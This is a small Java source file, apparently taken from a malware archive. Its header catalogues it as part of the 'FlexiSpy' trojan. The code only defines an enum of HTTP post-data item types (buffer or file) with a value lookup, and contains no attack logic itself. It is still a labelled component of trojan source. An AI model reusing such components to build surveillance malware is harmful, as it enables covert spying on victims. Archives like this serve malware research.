/*
  name      FlexiSpy
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    RamadhanAmizudin/malware
  archived  RamadhanAmizudin, krisyotam (2026)
  notes     —
 */
package com.vvt.http.request;

import java.util.HashMap;
import java.util.Map;

public enum PostDataItemType {

	BUFFER(0),
	FILE(1);
	
	private static final Map<Integer, PostDataItemType> typesByValue = new HashMap<Integer, PostDataItemType>();

	private final int number;

	static {
		for (PostDataItemType type : PostDataItemType.values()) {
			typesByValue.put(type.number, type);
		}
	}

	private PostDataItemType(int value) {
		this.number = value;
	}

	public int getNumber() {
		return number;
	}

	public static PostDataItemType forValue(int value) {
		return typesByValue.get(value);
	}
}
